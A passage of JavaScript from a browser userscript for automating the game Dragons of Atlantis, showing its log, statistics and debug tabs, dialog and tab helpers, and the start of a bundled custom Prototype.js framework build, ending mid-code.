            var b = '<ul class=tabs><li class="tab first"><a id=' + setUID("tabLogActions") + ">" + translate("Actions") + "</a></li><li class=tab><a id=" + setUID("tabLogConsole") + ">" + translate("Console") + "</a></li><li class=tab><a id=" + setUID("tabLogDebug") + ">" + translate("Debug") + "</a></li><li class=tab><a id=" + setUID("tabLogStats") + ">" + translate("Statistics") + "</a></li></ul><div id=" + setUID("tabLog_Title") + " class=" + UID.title + ">" + translate("Action Log") + '</div><div style="position:absolute; height:645px; max-height:645px; overflow-y:auto;"><table id=' + setUID("tabLog_Action") + " class=" + UID.table_console + " cellspacing=1><tr><td class=" + UID.underline + "></td><td class=" + UID.underline + ' width=95%></td><tr></table></div><div style="position:absolute; height:645px; max-height:645px; overflow-y:auto;"><table id=' + setUID("tabLog_Console") + " class=" + UID.table_console + " cellspacing=1><tr><td class=" + UID.underline + "></td><td class=" + UID.underline + ' width=95%></td><tr></table></div><div style="position:absolute; height:645px; max-height:645px; overflow-y:auto;"><table id=' + setUID("tabLog_Debug") + " class=" + UID.table_console + " cellspacing=1><tr><td class=" + UID.underline + "></td><td class=" + UID.underline + " width=95%></td><tr></table></div><div><center><table id=" + setUID("tabLog_Stats") + ' class="' + UID.table + " " + UID.table_console + '" border=1 cellspacing=1 width=97%></table></center></div>';
            t.$container.html(b);
            t.content.push($id(UID.tabLog_Action));
            $J("#" + UID.tabLogActions).click(t.tabLogActions);
            t.content.push($id(UID.tabLog_Console));
            $J("#" + UID.tabLogConsole).click(t.tabLogConsole);
            t.content.push($id(UID.tabLog_Debug));
            $J("#" + UID.tabLogDebug).click(t.tabLogDebug);
            t.content.push($id(UID.tabLog_Stats));
            $J("#" + UID.tabLogStats).click(t.tabLogStats);
            if (Data.options.verbose_log.enabled === false) {
                $J("#" + UID.tabLogConsole).hide();
                $J(t.content[1].parentNode).hide()
            }
            if (T === false) {
                $J("#" + UID.tabLogDebug).hide();
                $J(t.content[2].parentNode).hide();
                $J("#" + UID.tabLogStats).hide();
                $J(t.content[3].parentNode).hide()
            }
            t.title = $id(UID.tabLog_Title);
            t.state = 1;
            for (var i = 0; i < Data.logs.length; i++) {
                var c = Data.logs[i];
                for (var j = 0; j < c.length; j++) {
                    t._addRow(c[j].msg, c[j].ts, i)
                }
            }
            if (!Data.requests.start_at) {
                Data.requests.start_at = serverTime()
            }
            t.tabLogActions()
        },
        tabLogToggleDebug: function () {
            var t = Tabs.Log;
            $J("#" + UID.tabLogDebug).toggle();
            $J(t.content[2].parentNode).toggle();
            $J("#" + UID.tabLogStats).toggle();
            $J(t.content[3].parentNode).toggle()
        },
        tabLogActions: function () {
            var t = Tabs.Log;
            $J("#" + UID[t.last_subtab]).css("z-index", "0").removeClass("selected");
            $J("#" + UID.tabLogActions).css("z-index", "1").addClass("selected");
            t.last_subtab = "tabLogActions";
            $J(t.content[0]).parent().show();
            $J(t.content[1]).parent().hide();
            $J(t.content[2]).parent().hide();
            $J(t.content[3]).parent().hide();
            clearTimeout(t.stats_timer);
            t.title.innerHTML = translate("Action Log")
        },
        tabLogConsole: function () {
            var t = Tabs.Log;
            $J("#" + UID[t.last_subtab]).css("z-index", "0").removeClass("selected");
            $J("#" + UID.tabLogConsole).css("z-index", "1").addClass("selected");
            t.last_subtab = "tabLogConsole";
            $J(t.content[0]).parent().hide();
            $J(t.content[1]).parent().show();
            $J(t.content[2]).parent().hide();
            $J(t.content[3]).parent().hide();
            clearTimeout(t.stats_timer);
            t.title.innerHTML = translate("Console Log")
        },
        tabLogDebug: function () {
            var t = Tabs.Log;
            $J("#" + UID[t.last_subtab]).css("z-index", "0").removeClass("selected");
            $J("#" + UID.tabLogDebug).css("z-index", "1").addClass("selected");
            t.last_subtab = "tabLogDebug";
            $J(t.content[0]).parent().hide();
            $J(t.content[1]).parent().hide();
            $J(t.content[2]).parent().show();
            $J(t.content[3]).parent().hide();
            clearTimeout(t.stats_timer);
            t.title.innerHTML = translate("Debug")
        },
        tabLogStats: function () {
            var t = Tabs.Log;
            var a = "";
            $J("#" + UID[t.last_subtab]).css("z-index", "0").removeClass("selected");
            $J("#" + UID.tabLogStats).css("z-index", "1").addClass("selected");
            t.last_subtab = "tabLogStats";
            $J(t.content[0]).parent().hide();
            $J(t.content[1]).parent().hide();
            $J(t.content[2]).parent().hide();
            $J(t.content[3]).parent().show();
            clearTimeout(t.stats_timer);
            t.title.innerHTML = translate("Statistics");
            var b = 0;
            var c = 0;
            for (var d in Data.requests) {
                if (Data.requests.hasOwnProperty(d) && typeof Data.requests[d].total !== "undefined") {
                    b += Data.requests[d].total;
                    c += Data.requests[d].errors
                }
            }
            Data.requests.run_time = serverTime() - Data.requests.start_at;
            var e = (Data.requests.run_time > 0) ? (Data.requests.run_time / 3600) : 1;
            a += "<TR><TH width=35%>" + translate("Request") + "</TH><TH>" + translate("Total") + "</TH><TH>" + translate("Rate") + "</TH><TH>" + translate("Errors") + "</TH></TR>";
            var f = Data.requests.manifest.total / e;
            a += "<TR><TD align=right>" + translate("Manifest") + " : </TD><TD align=right>" + Data.requests.manifest.total + "</TD><TD align=right>" + f.intToCommas() + "/" + translate("h") + "</TD><TD align=right class=" + UID.bold_red + ">" + Data.requests.manifest.errors + "</TD></TR>";
            var f = Data.requests.player.total / e;
            a += "<TR><TD align=right>" + translate("Player") + " : </TD><TD align=right>" + Data.requests.player.total + "</TD><TD align=right>" + f.intToCommas() + "/" + translate("h") + "</TD><TD align=right class=" + UID.bold_red + ">" + Data.requests.player.errors + "</TD></TR>";
            var f = Data.requests.cities.total / e;
            a += "<TR><TD align=right>" + translate("City") + " : </TD><TD align=right>" + Data.requests.cities.total + "</TD><TD align=right>" + f.intToCommas() + "/" + translate("h") + "</TD><TD align=right class=" + UID.bold_red + ">" + Data.requests.cities.errors + "</TD></TR>";
            var f = Data.requests.generals.total / e;
            a += "<TR><TD align=right>" + translate("Generals") + " : </TD><TD align=right>" + Data.requests.generals.total + "</TD><TD align=right>" + f.intToCommas() + "/" + translate("h") + "</TD><TD align=right class=" + UID.bold_red + ">" + Data.requests.generals.errors + "</TD></TR>";
            a += "<TR><TD colspan=4>&nbsp;</TD></TR>";
            var f = Data.requests.map.total / e;
            a += "<TR><TD align=right>" + translate("Map") + " : </TD><TD align=right>" + Data.requests.map.total + "</TD><TD align=right>" + f.intToCommas() + "/" + translate("h") + "</TD><TD align=right class=" + UID.bold_red + ">" + Data.requests.map.errors + "</TD></TR>";
            a += "<TR><TD colspan=4>&nbsp;</TD></TR>";
            var f = Data.requests.marches.total / e;
            a += "<TR><TD align=right>" + translate("Marches") + " : </TD><TD align=right>" + Data.requests.marches.total + "</TD><TD align=right>" + f.intToCommas() + "/" + translate("h") + "</TD><TD align=right class=" + UID.bold_red + ">" + Data.requests.marches.errors + "</TD></TR>";
            var f = Data.requests.recalls.total / e;
            a += "<TR><TD align=right>" + translate("Recall") + " : </TD><TD align=right>" + Data.requests.recalls.total + "</TD><TD align=right>" + f.intToCommas() + "/" + translate("h") + "</TD><TD align=right class=" + UID.bold_red + ">" + Data.requests.recalls.errors + "</TD></TR>";
            var f = Data.requests.abandon.total / e;
            a += "<TR><TD align=right>" + translate("Wilderness") + " " + translate("Leave") + " : </TD><TD align=right>" + Data.requests.abandon.total + "</TD><TD align=right>" + f.intToCommas() + "/" + translate("h") + "</TD><TD align=right class=" + UID.bold_red + ">" + Data.requests.abandon.errors + "</TD></TR>";
            a += "<TR><TD colspan=4>&nbsp;</TD></TR>";
            var f = Data.requests.reports.total / e;
            a += "<TR><TD align=right>" + translate("Reports") + " : </TD><TD align=right>" + Data.requests.reports.total + "</TD><TD align=right>" + f.intToCommas() + "/" + translate("h") + "</TD><TD align=right class=" + UID.bold_red + ">" + Data.requests.reports.errors + "</TD></TR>";
            var f = Data.requests.msg_read.total / e;
            a += "<TR><TD align=right>" + translate("Read Report") + " : </TD><TD align=right>" + Data.requests.msg_read.total + "</TD><TD align=right>" + f.intToCommas() + "/" + translate("h") + "</TD><TD align=right class=" + UID.bold_red + ">" + Data.requests.msg_read.errors + "</TD></TR>";
            var f = Data.requests.msg_delete.total / e;
            a += "<TR><TD align=right>" + translate("Delete") + " " + translate("Reports") + " : </TD><TD align=right>" + Data.requests.msg_delete.total + "</TD><TD align=right>" + f.intToCommas() + "/" + translate("h") + "</TD><TD align=right class=" + UID.bold_red + ">" + Data.requests.msg_delete.errors + "</TD></TR>";
            a += "<TR><TD colspan=4>&nbsp;</TD></TR>";
            var f = Data.requests.training.total / e;
            a += "<TR><TD align=right>" + translate("Training") + " : </TD><TD align=right>" + Data.requests.training.total + "</TD><TD align=right>" + f.intToCommas() + "/" + translate("h") + "</TD><TD align=right class=" + UID.bold_red + ">" + Data.requests.training.errors + "</TD></TR>";
            var f = Data.requests.research.total / e;
            a += "<TR><TD align=right>" + translate("Research") + " : </TD><TD align=right>" + Data.requests.research.total + "</TD><TD align=right>" + f.intToCommas() + "/" + translate("h") + "</TD><TD align=right class=" + UID.bold_red + ">" + Data.requests.research.errors + "</TD></TR>";
            var f = Data.requests.building.total / e;
            a += "<TR><TD align=right>" + translate("Building") + " : </TD><TD align=right>" + Data.requests.building.total + "</TD><TD align=right>" + f.intToCommas() + "/" + translate("h") + "</TD><TD align=right class=" + UID.bold_red + ">" + Data.requests.building.errors + "</TD></TR>";
            a += "<TR><TD colspan=4>&nbsp;</TD></TR>";
            var f = Data.requests.collect.total / e;
            a += "<TR><TD align=right>" + translate("Auto-Collect") + " : </TD><TD align=right>" + Data.requests.collect.total + "</TD><TD align=right>" + f.intToCommas() + "/" + translate("h") + "</TD><TD align=right class=" + UID.bold_red + ">" + Data.requests.collect.errors + "</TD></TR>";
            a += "<TR><TD colspan=4>&nbsp;</TD></TR>";
            var f = b / e;
            a += "<TR><TD align=right><b>" + translate("Total") + " : </b></TD><TD align=right><b>" + b + "</b></TD><TD align=right><b>" + f.intToCommas() + "/" + translate("h") + "</b></TD><TD align=right class=" + UID.bold_red + "><b>" + c + "</b></TD></TR>";
            a += "<TR><TD colspan=4>&nbsp;</TD></TR>";
            a += "<TR><td class=right align=right>" + translate("Start Date") + " : </td><TD colspan=3>" + new Date(Data.requests.start_at * 1000).myString() + "</TD></TR><TR><td class=right align=right>" + translate("Run Time") + " : </td><TD colspan=3>" + timeFormat(Data.requests.run_time, true) + "</TD></TR>";
            a += "<TR><TD colspan=4>&nbsp;</TD></TR>";
            a += "<TR><td colspan=4 align=center><input id=" + setUID("tabLogStats_Clear") + ' type=button value="' + translate("Delete") + " " + translate("Statistics") + '" /></center></td></TR>';
            $J(t.content[3]).html(a);
            $J("#" + UID.tabLogStats_Clear).click(t.clearStats);
            t.stats_timer = setTimeout(t.tabLogStats, 1000)
        },
        clearStats: function () {
            Data.requests.start_at = serverTime();
            for (var a in Data.requests) {
                if (Data.requests.hasOwnProperty(a) && typeof Data.requests[a].total !== "undefined") {
                    Data.requests[a].total = 0;
                    Data.requests[a].errors = 0
                }
            }
        },
        hide: function () {
            var t = Tabs.Log;
            clearTimeout(t.stats_timer)
        },
        show: function () {},
        _addRow: function (a, b, c) {
            var t = Tabs.Log;
            var n = c ? c : 0;
            if (t.state !== 1) {
                return
            }
            if (t.content[n].rows.length > t.max_entries) {
                t.content[n].deleteRow(0)
            }
            var d = t.content[n].insertRow(-1);
            var e = d.insertCell(0);
            var f = d.insertCell(1);
            e.className = "jewel";
            e.innerHTML = "(&nbsp;" + b + "&nbsp;)&nbsp;";
            f.innerHTML = a;
            f.style.whiteSpace = "normal"
        },
        addMsg: function (a, b) {
            if (Tabs.Log.tab_disabled) {
                return
            }
            var t = Tabs.Log;
            var n = b ? b : 0;
            var c = new Date().toTimeString().substring(0, 8);
            t._addRow(a, c, b);
            while (Data.logs[n].length > t.max_entries) {
                Data.logs[n].shift()
            }
            Data.logs[n].push({
                msg: a,
                ts: c
            })
        }
    };

    function actionLog(a) {
        Tabs.Log.addMsg(a, 0)
    }
    function debugLog(a) {
        if (T) {
            Tabs.Log.addMsg(a.replace(/\n/g, "<br/>"), 2)
        }
    }
    function verboseLog(a) {
        if (Data.options.verbose_log.enabled) {
            Tabs.Log.addMsg(a, 1)
        }
    }
    Tabs.Debug = {
        tab_order: M,
        tab_label: "Debug",
        tab_disabled: !T,
        container: null,
        init: function (a) {
            var t = Tabs.Debug;
            t.container = a;
            t.mouseElement = a;
            var b = '<textarea id="' + setUID("tabsDebug_TA_Unescape") + '" row=3 cols=50></textarea><input type=button value="unescape" id="' + setUID("tabsDebug_BTN_Unescape") + '" /><br><br><input type=button value="Seed.Player" id="' + setUID("tabsDebug_BTN_SeedPlayer") + '" /> <br><br><input type=button value="Seed.Cities" id="' + setUID("tabsDebug_BTN_SeedCities") + '" /> <br><br><input type=button value="Seed.Jobs.city" id="' + setUID("tabsDebug_BTN_SeedJobCity") + '" /><br><br><input type=button value="Seed.Marches" id="' + setUID("tabsDebug_BTN_SeedMarches") + '" /><br><br><input type=button value="Seed.Buildings" id="' + setUID("tabsDebug_BTN_SeedBuildings") + '" /><br><br><input type=button value="Clear MAP data" id="' + setUID("tabsDebug_BTN_ClearMap") + '" /><br><br><input type=button value="All Terrains.last to null" id="' + setUID("tabsDebug_BTN_LastNull") + '" /><br><br><input type=button value="Check reports" id="' + setUID("tabsDebug_BTN_Reports") + '" /><br><br><input type=button value="Persistant Data" id="' + setUID("tabsDebug_BTN_Data") + '" /><br><br><input type=button value="Scripts" id="' + setUID("tabsDebug_BTN_Scripts") + '" /><br><br><br>Missing Reports:<span id="' + setUID("tabsDebug_MissRep") + '"></span> &nbsp; <input id="' + setUID("tabsDebug_BTN_Reset") + '" type=button value="RESET" />';
            a.innerHTML = b;
            $J("#" + UID.tabsDebug_BTN_Unescape).click(t.unescape);
            $J("#" + UID.tabsDebug_BTN_SeedPlayer).click(t.seedPlayer);
            $J("#" + UID.tabsDebug_BTN_SeedCities).click(t.seedCities);
            $J("#" + UID.tabsDebug_BTN_SeedJobCity).click(t.seedJobsCity);
            $J("#" + UID.tabsDebug_BTN_SeedMarches).click(t.seedMarches);
            $J("#" + UID.tabsDebug_BTN_SeedBuildings).click(t.seedBuildings);
            $J("#" + UID.tabsDebug_BTN_LastNull).click(t.setLastNull);
            $J("#" + UID.tabsDebug_BTN_ClearMap).click(t.clearMap);
            $J("#" + UID.tabsDebug_BTN_Reports).click(t.readReports);
            $J("#" + UID.tabsDebug_BTN_Scripts).click(t.dispScripts);
            $J("#" + UID.tabsDebug_BTN_Data).click(t.dispData);
            $J("#" + UID.tabsDebug_BTN_Reset).click(function () {
                Data.options.messages.missing = 0;
                t.showMissingReports()
            });
            t.showMissingReports()
        },
        show: function () {},
        hide: function () {},
        unescape: function (a) {
            var t = Tabs.Debug;
            var b = $id(UID.tabsDebug_TA_Unescape);
            b.value = unescape(b.value)
        },
        seedBuildings: function () {
            var t = Tabs.Debug;
            t.dispBuildings("Seed.cities.capital.buildings", Seed.cities[0].buildings);
            for (var a = 1; a < Seed.cities.length; a++) {
                if (!Seed.cities[a]) {
                    continue
                }
                t.dispBuildings("Seed.cities.outpost.buildings", Seed.cities[a].buildings)
            }
        },
        dispScripts: function () {
            var t = Tabs.Debug;
            var a = dialogBox({
                id: setUID("dialog-debug"),
                width: 900,
                height: 700,
                centerTo: t.container,
                title: "Debug - List Scripts",
                html: translate("Scanning Map").replace("$NUM$", Data.options.map.radius),
            });
            var b = document.getElementsByTagName("script");
            var c = "<DIV class=" + UID.content + ' style="height:560px; max-height:560px; overflow:auto">';
            for (var i = 0; i < b.length; i++) {
                var d = b[i].innerHTML;
                if (d === undefined) {
                    c += "no code<BR>"
                } else {
                    c += "Source: " + b[i].src + "<BR>Length: " + d.length + "<BR>" + d.substr(0, 1000).escapeHTML() + "<BR><HR>"
                }
            }
            a.html(c)
        },
        dispBuildings: function (c, d) {
            var b = [];
            for (var i = 0; i < d.length; i++) {
                b.push(d[i])
            }
            b.sort(function (a, b) {
                if (a.location !== b.location) {
                    if (a.location === "city") {
                        return -1
                    }
                    return 1
                }
                return a.slot - b.slot
            });
            var e = c + ":\n";
            for (var i = 0; i < b.length; i++) {
                e += b[i].location + " slot #" + b[i].slot + " : Level " + b[i].level + " " + b[i].type + "\n"
            }
            debugLog(e)
        },
        showMissingReports: function () {
            var t = Tabs.Debug;
            $id(UID.tabsDebug_MissRep).innerHTML = Data.options.messages.missing;
            setTimeout(t.showMissingReports, 2000)
        },
        readReports: function () {
            Messages.checkMessages({
                category: "reports"
            })
        },
        seedPlayer: function () {
            debugLog(inspect(Seed.player, 8, 1))
        },
        seedCities: function () {
            debugLog(inspect(Seed.cities, 8, 1))
        },
        seedJobsCity: function () {
            var a = parseInt(serverTime());
            for (var c in Seed.jobs) {
                debugLog("Seed.jobs[" + c + "] (city #" + Seed.city_idx[c] + ") now=" + a + ":\n" + inspect(Seed.jobs[c], 8, 1))
            }
        },
        seedMarches: function () {
            var a = parseInt(serverTime());
            var b = "***** Seed.marches: *****  (now=" + parseInt(serverTime()) + ")\n";
            for (var c in Seed.marches) {
                var d = Seed.marches[c];
                b += "OWNER: " + d.owner_id + " ID: " + d.id + " " + d.status + " " + d.x + "," + d.y + " " + d.run_at + "(" + (d.run_at - a) + ") " + d.duration + "\n"
            }
            debugLog(b)
        },
        dispData: function () {
            if (Data.itemList === undefined) {
                Data.itemList = ["marches"]
            }
            var a = "";
            for (var b in Data.itemsList) {
                a += "***** Data." + Data.itemsList[b] + ":\n" + inspect(Data[Data.itemsList[b]], 12, 1)
            }
            debugLog(a)
        },
        clearMap: function () {
            Data.map = {
                terrains: {
                    AnthropusCamp: [],
                    Bog: [],
                    Forest: [],
                    Grassland: [],
                    Hill: [],
                    Lake: [],
                    Mountain: [],
                    Plain: [],
                    City: [],
                    Outpost: [],
                    Wildernesses: []
                },
                radius: 14,
                x: Seed.cities[0].x,
                y: Seed.cities[0].y,
                targets: []
            }
        },
        setLastNull: function () {
            for (var a in Data.map.terrains) {
                for (var i = 0; i < Data.map.terrains[a].length; i++) {
                    (Data.map.terrains[a])[i].lst = 0
                }
            }
        },
    };

    function dialogBox(c) {
        var d = c.id || "dialog-box";
        var e = $J("<div id=" + d + "></div>").html(c.html || "");
        e.dialog({
            autoOpen: c.autoOpen || true,
            buttons: c.buttons || [{
                text: translate("Ok"),
                click: function () {
                    if (e._overlay) {
                        e._overlay.remove()
                    }
                    e.dialog("destroy")
                }
            }],
            closeText: c.closeText || translate("Close"),
            dialogClass: c.dialogClass || "",
            draggable: c.draggable || true,
            height: c.height || "auto",
            hide: c.hide || "fade",
            minHeight: c.minHeight || 70,
            position: c.position || "center",
            resizable: c.resizable || false,
            show: c.show || "fade",
            title: c.title || "",
            width: c.width || "auto",
            minWidth: c.minWidth || 150,
            maxWidth: c.maxWidth || (c.centerTo ? $J(c.centerTo).innerWidth() - 50 : false),
            zIndex: c.zIndex || 1001,
            close: function (a, b) {
                if (c.close instanceof Function) {
                    c.close(a, b)
                }
                if (e._overlay) {
                    e._overlay.remove()
                }
                if (e._timeOut) {
                    e.stopTime()
                }
                if (!e._notdestroy) {
                    e.dialog("destroy")
                }
            },
            create: c.create || null,
            drag: c.drag || null,
            dragStart: function (a, b) {
                if (c.dragStart instanceof Function) {
                    c.dragStart(a, b)
                }
                e.parent().css("opacity", "0.7")
            },
            dragStop: function (a, b) {
                if (c.dragStop instanceof Function) {
                    c.dragStop(a, b)
                }
                e.parent().css("opacity", "1")
            },
            focus: c.focus || null,
            open: function (a, b) {
                if (c.open instanceof Function) {
                    c.open(a, b)
                }
                if (e._timeOut) {
                    e.oneTime(e._timeOut, function () {
                        e.close()
                    })
                }
            }
        });
        e._notdestroy = c.notdestroy;
        e._timeOut = c.timeOut;
        e.centerTo = function (a) {
            e._centerTo = a || e._centerTo;
            var b = $J(e._centerTo).offset();
            var x = parseInt($J(e._centerTo).outerWidth() - $J("#" + d).outerWidth()) / 2 + b.left;
            var y = parseInt($J(e._centerTo).outerHeight() - $J("#" + d).outerHeight()) / 2 + b.top;
            e.dialog("option", "position", [x, y])
        };
        if (c.centerTo) {
            e.centerTo(c.centerTo)
        }
        if (c.overlay) {
            var f = $J(c.centerTo || document.body);
            var g = $J("<div id=" + d + "-overlay></div>").appendTo(f.parent() || document.body);
            g.css("position", "absolute");
            g.css("display", "block");
            g.css("background-color", "#000");
            g.css("opacity", "0.5");
            g.css("top", "0");
            g.css("width", (f.outerWidth() + 4) + "px");
            g.css("height", (f.outerHeight() + 4) + "px");
            g.css("z-index", "1000");
            g.css("box-shadow", "rgba(0,0,0,0.5) 0 0 10px");
            g.css("-khtml-box-shadow", "rgba(0,0,0,0.5) 0 0 10px");
            g.css("-moz-box-shadow", "rgba(0,0,0,0.5) 0 0 10px");
            g.css("-webkit-box-shadow", "rgba(0,0,0,0.5) 0 0 10px");
            e._overlay = g
        }
        e.close = function () {
            e.dialog("close");
            if (e._overlay) {
                e._overlay.css("display", "none")
            }
        };
        e.open = function () {
            e.dialog("open");
            if (e._overlay) {
                e._overlay.css("display", "block")
            }
        };
        e.isOpen = function () {
            return e.dialog("isOpen")
        };
        e.destroy = function () {
            if (e._overlay) {
                e._overlay.remove()
            }
            e.dialog("destroy")
        };
        e.option = function (a, b) {
            e.dialog("option", a, b)
        };
        e.title = function (a) {
            e.dialog("option", "title", a)
        };
        e.buttons = function (a) {
            e.dialog("option", "buttons", a)
        };
        e.draggable = function (a) {
            e.dialog("option", "draggable", a)
        };
        e.position = function (a) {
            e.dialog("option", "position", a)
        };
        e.timeOut = function (a) {
            e._timeOut = a;
            e.open()
        };
        return e
    }
    function dialogError(a, b) {
        dialogBox({
            id: setUID("dialog-error"),
            minWidth: 300,
            minHeight: 150,
            centerTo: b || document.body,
            title: translate("Error"),
            html: "<br>" + a
        })
    }
    var bj = {
        steps: 0,
        step: 0,
        delay: 10000,
        currentTime: 0,
        totalTime: 0,
        timer: 0,
        start: function (a) {
            var t = bj;
            t.steps = a.steps;
            t.delay = a.delay || t.delay;
            t.totalTime = t.steps * t.delay;
            t.step = 0;
            t.currentTime = 0;
            t.$stepbar = $J("<div id=" + setUID(a.id || "time-bar") + "></div>").appendTo(a.target || document.body);
            clearInterval(t.timer);
            t.timer = setInterval(t._progress, 250)
        },
        stop: function () {
            var t = bj;
            t.delay = 10000;
            clearInterval(t.timer);
            t.$stepbar.remove()
        },
        update: function (a) {
            var t = bj;
            t.step = a;
            t.delay = parseInt((t.delay + t.currentTime) / a);
            t.totalTime = t.delay * t.steps
        },
        _progress: function () {
            var t = bj;
            t.currentTime += 250;
            var a = parseInt(t.currentTime * 100 / t.totalTime);
            t.$stepbar.progressbar({
                value: a
            });
            if (a >= 100) {
                t.stop()
            }
        }
    };

    function logit(a) {
        var b = new Date();
        console.log(SERVER_ID + " @ " + b.toTimeString().substring(0, 8) + "." + b.getMilliseconds() + ": " + a)
    }
    var bk = {
        tabList: {},
        current_tab: null,
        init: function (c) {
            var t = bk;
            var d = [];
            for (k in Tabs) {
                if (!Tabs[k].tab_disabled) {
                    t.tabList[k] = {};
                    t.tabList[k].name = k;
                    t.tabList[k].uid = setUID("tab_" + k);
                    t.tabList[k].obj = Tabs[k];
                    if (Tabs[k].tab_label !== null) {
                        t.tabList[k].label = translate(Tabs[k].tab_label)
                    } else {
                        t.tabList[k].label = k
                    }
                    if (Tabs[k].tab_order !== null) {
                        d.push([Tabs[k].tab_order, t.tabList[k]])
                    } else {
                        d.push([1000, t.tabList[k]])
                    }
                    t.tabList[k].div = document.createElement("div")
                }
            }
            d.sort(function (a, b) {
                return a[0] - b[0]
            });
            var f = "<ul class=tabs>";
            f += '<li class="tab first"><a id=' + d[0][1].uid + ">" + d[0][1].label + "</a></li>";
            for (var i = 1; i < d.length; i++) {
                f += "<li class=tab><a id=" + d[i][1].uid + ">" + d[i][1].label + "</a></li>"
            }
            f += "</ul>";
            $main_box.html(f);
            t.current_tab = null;
            for (k in t.tabList) {
                if (t.tabList[k].name === Data.options.current_tab) {
                    t.current_tab = t.tabList[k]
                }
                $J("#" + t.tabList[k].uid).click(this.e_clickedTab);
                var g = t.tabList[k].div;
                g.className = "container";
                g.style.display = "none";
                c.append(g);
                try {
                    t.tabList[k].obj.init(g)
                } catch (e) {
                    g.innerHTML += "INIT ERROR: " + e + " at line:" + e.lineNumber
                }
            }
            if (t.current_tab === null) {
                t.current_tab = d[0][1]
            }
            t.setTabStyle($id(t.current_tab.uid), true);
            t.current_tab.div.style.display = "block"
        },
        hideTab: function () {
            var t = bk;
            t.current_tab.obj.hide()
        },
        showTab: function () {
            var t = bk;
            t.current_tab.obj.show()
        },
        setTabStyle: function (a, b) {
            if (b) {
                a.style.zIndex = 1;
                a.className = "tab selected"
            } else {
                a.style.zIndex = 0;
                a.className = "tab"
            }
        },
        e_clickedTab: function (a) {
            var t = bk;
            for (k in t.tabList) {
                if (t.tabList[k].uid === a.target.id) {
                    var b = t.tabList[k];
                    break
                }
            }
            if (t.current_tab.name !== b.name) {
                t.setTabStyle($id(b.uid), true);
                t.setTabStyle($id(t.current_tab.uid), false);
                t.current_tab.obj.hide();
                t.current_tab.div.style.display = "none";
                t.current_tab = b;
                b.div.style.display = "block";
                Data.options.current_tab = b.name
            }
            b.obj.show()
        }
    };
    var bl = Math.randRange(300, 320);
    $startUpBox = dialogBox({
        id: setUID("startup-box"),
        buttons: {},
        position: [parseInt(document.body.offsetWidth - (document.body.offsetWidth - 760) / 2 - bl / 2), Math.randRange(0, 20)],
        width: bl,
        height: Math.randRange(150, 160),
        title: translate("Initializing") + " v" + (SCRIPT_VERSION.match(/\d+?[a-h]/)[0] || "") + " ...",
        html: "<br><div id=" + setUID("startup-progressbar") + "></div><br>" + translate("Initializing") + "...",
        close: function (a, b) {
            clearTimeout(bi)
        }
    });
    bj.start({
        target: $J("#" + UID["startup-progressbar"]),
        steps: 4,
        delay: W * 3
    });
    setTimeout(scriptStartUp, W)
};
//\\\\\\\\\\\\\\\\\\\\\  END DoA PowerTools Script  //////////////////////\\































///////////////////////////  Prototype Custom  \\\\\\\\\\\\\\\\\\\\\\\\\\\

/*  Prototype JavaScript framework, version 1.7.1 (CUSTOM)
 *  (c) 2005-2010 Sam Stephenson
 *
 *  Prototype is freely distributable under the terms of an MIT-style license.
 *  For details, see the Prototype web site: http://www.prototypejs.org/
 *
 *--------------------------------------------------------------------------*/
/*****************************************************************************
*  INDLUDE: Browser, Class, Enumerable, Hash,  ObjectRange, PeriodicalExecuter, Template, Try.
*  EXTEND : Array, Date, Function, Number, Object, String.
*  NOT ICLUDE : Ajax, Element, Event, Form, Selector, Sizzle.
*
*  Size: 36 kb
*****************************************************************************/
var Prototype={Version:"1.7.1",Browser:(function(){var ua=navigator.userAgent;var isOpera=Object.prototype.toString.call(window.opera)=="[object Opera]";return{Opera:isOpera,WebKit:ua.indexOf("AppleWebKit/")>-1,Gecko:ua.indexOf("Gecko")>-1&&ua.indexOf("KHTML")===-1,MobileSafari:/Apple.*Mobile/.test(ua)};})(),BrowserFeatures:{XPath:!!document.evaluate,SelectorsAPI:!!document.querySelector,ElementExtensions:(function(){var constructor=window.Element||window.HTMLElement;return !!(constructor&&constructor.prototype);})(),SpecificElementExtensions:(function(){if(typeof window.HTMLDivElement!=="undefined"){return true;}var div=document.createElement("div"),form=document.createElement("form"),isSupported=false;if(div.__proto__&&(div.__proto__!==form.__proto__)){isSupported=true;}div=form=null;return isSupported;})()},ScriptFragment:"<script[^>]*>([\\S\\s]*?)<\/script>",JSONFilter:/^\/\*-secure-([\s\S]*)\*\/\s*$/,emptyFunction:function(){},K:function(x){return x;}};if(Prototype.Browser.MobileSafari){Prototype.BrowserFeatures.SpecificElementExtensions=false;}var Abstract={};var Try={these:function(){var returnValue;for(var i=0,length=arguments.length;i<length;i++){var lambda=arguments[i];try{returnValue=lambda();break;}catch(e){}}return returnValue;}};var Class=(function(){var IS_DONTENUM_BUGGY=(function(){for(var p in {toString:1}){if(p==="toString"){return false;}}return true;})();function subclass(){}function create(){var parent=null,properties=$A(arguments);if(Object.isFunction(properties[0])){parent=properties.shift();}function klass(){this.initialize.apply(this,arguments);}Object.extend(klass,Class.Methods);klass.superclass=parent;klass.subclasses=[];if(parent){subclass.prototype=parent.prototype;klass.prototype=new subclass;parent.subclasses.push(klass);}for(var i=0,length=properties.length;i<length;i++){klass.addMethods(properties[i]);}if(!klass.prototype.initialize){klass.prototype.initialize=Prototype.emptyFunction;}klass.prototype.constructor=klass;return klass;}function addMethods(source){var ancestor=this.superclass&&this.superclass.prototype,properties=Object.keys(source);if(IS_DONTENUM_BUGGY){if(source.toString!=Object.prototype.toString){properties.push("toString");}if(source.valueOf!=Object.prototype.valueOf){properties.push("valueOf");}}for(var i=0,length=properties.length;i<length;i++){var property=properties[i],value=source[property];if(ancestor&&Object.isFunction(value)&&value.argumentNames()[0]=="$super"){var method=value;value=(function(m){return function(){return ancestor[m].apply(this,arguments);};})(property).wrap(method);value.valueOf=method.valueOf.bind(method);value.toString=method.toString.bind(method);}this.prototype[property]=value;}return this;}return{create:create,Methods:{addMethods:addMethods}};})();(function(){var _toString=Object.prototype.toString,NULL_TYPE="Null",UNDEFINED_TYPE="Undefined",BOOLEAN_TYPE="Boolean",NUMBER_TYPE="Number",STRING_TYPE="String",OBJECT_TYPE="Object",FUNCTION_CLASS="[object Function]",BOOLEAN_CLASS="[object Boolean]",NUMBER_CLASS="[object Number]",STRING_CLASS="[object String]",ARRAY_CLASS="[object Array]",DATE_CLASS="[object Date]",NATIVE_JSON_STRINGIFY_SUPPORT=window.JSON&&typeof JSON.stringify==="function"&&JSON.stringify(0)==="0"&&typeof JSON.stringify(Prototype.K)==="undefined";function Type(o){switch(o){case null:return NULL_TYPE;case (void 0):return UNDEFINED_TYPE;}var type=typeof 